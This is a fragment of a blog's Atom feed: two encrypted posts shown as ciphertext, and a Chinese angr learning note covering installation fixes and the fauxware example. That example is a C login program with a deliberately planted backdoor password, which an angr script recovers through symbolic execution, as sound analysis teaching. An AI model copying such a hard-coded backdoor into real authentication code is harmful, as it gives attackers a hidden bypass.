7tvqzBv4hCKVXAsSqStlvKVVvz8gUBsjxcYyGDhimTUTrUa4j6DUdsMe8Yf0ZfseiZny2gI/JlNAEXVzq6pu1VnLezY2Sc9Qe+Lj2fH+Y0wtgrssFdc7RtgzXM2lQQLfD1R9g2LSV1EgfeISI7l5QcmNnZ9fVRxUTQL+ty4jwaF0lkinbK8s1nxFPbfCbSMDZAcY3ls2lw5vfeqKfLuD3HL79PzNTol+npq6bT58JfgjI9tb8LpqeuFKLip4BY79NSTdt0xB5Cz/Z8vYWcq6ejpK3ZeQma6IyRJpq++J9rZHoRlwVgNMRa2dimmQlwE0ita2HmrDoeSCpFuyaOPxaGmV309+kPW54Y+PPRno+uS7w4Dlu95sYeB6mkY8JUtR9xCdrJeDP+s7CbkMqKTXPUTtycUpUUtGQ+yjC8LvUH6gh/JjXVdPb+yQCNTgvnvHp69wxmfH09XoZMNRTaB2jZTgGMU+KBZo0gdBPqYmlYbe6rV3TkkmC50NaWc7jjbV+KxmzOig1bU7UXiS+6w4veZFRrwiRR/nDW5zYQVKcqEp0F2v4PFYwv12O1EvHDr348Kh1xm09pMD4mslnOR35smR3IfomfNMycrsy+hibcEqtzaO64lQJDTNnzF4TSRMJIkOC5XNXYAkfBa06Gs46FENMUBnKJ8SLdOHakTdGn2RFr0g3lCiQrBmqeaKjDFp8ZtmYbGJZKoTPMlxN7L9AUPUGYMm8URnSiYLMbnlJP3fJEvFAyXGVGeUvEBzbaqbGSEXjPJBtbXuc9wycxm9OSTvJ7f7X53z9ZnlirmrLYorJER4yONFTP8VzuNDH/KXOiEc8wSO9bMvL5ENvLIQCwDdw/yJNXAxiUtqJGqi9yj8e22d8/QsSUzxMwhVSS5Slk9DEoa6f41Sn/pRlIl667GGXh/R+DYlti1UUTDmrF3UW6qJplySe6MNFQeMkv0sKkIaXYFGkRvCMd5eXFwwrE0oY6KGYAQlc67Km09tsWUq90x3FCkSioD3v+u+3ymMP8ZKY5rqep</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-02T10:54:02.233Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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